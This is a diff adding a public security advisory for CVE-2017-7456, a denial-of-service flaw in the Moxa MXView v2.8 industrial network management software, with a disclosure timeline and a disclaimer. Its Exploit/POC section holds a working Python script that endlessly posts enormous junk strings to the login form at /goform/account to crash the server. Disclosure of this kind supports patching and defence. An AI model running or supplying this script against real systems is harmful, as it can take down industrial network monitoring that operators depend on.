@@ -1,0 +1,96 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MOXA-MXVIEW-v2.8-DENIAL-OF-SERVICE.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+============
+www.moxa.com
+
+
+
+Product:
+===========
+MXView v2.8
+
+Download:
+http://www.moxa.com/product/MXstudio.htm
+
+MXview Industrial Network Management Software.
+
+Auto discovery of network devices and physical connections
+Event playback for quick troubleshooting
+Color-coded VLAN/IGMP groups and other visualized network data
+Supports MXview ToGo mobile app for remote monitoring and notification—anytime, anywhere.
+
+
+
+Vulnerability Type:
+===================
+Denial Of Service
+
+
+
+CVE Reference:
+==============
+CVE-2017-7456
+
+
+
+Security Issue:
+================
+Remote attackers can DOS MXView server by sending large string of junk characters for the user ID and password field login credentials.
+
+
+
+Exploit/POC:
+=============
+import urllib,urllib2
+
+print 'Moxa MXview v2.8 web interface DOS'
+print 'hyp3rlinx'
+
+IP=raw_input("[Moxa MXView IP]>")
+
+PAYLOAD="A"*200000000
+
+url = 'http://'+IP+'/goform/account'
+data = urllib.urlencode({'uid' :  PAYLOAD, 'pwd' : PAYLOAD, 'action' : 'login'})
+
+while 1:
+    req = urllib2.Request(url, data)
+    res = urllib2.urlopen(req)
+    print res
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+==========================================================
+Vendor Notification:  March 5, 2017
+Vendor confirms vulnerability : March 21, 2017
+Vendor "updated firmware April 7, 2017" : March 29, 2017
+April 9, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
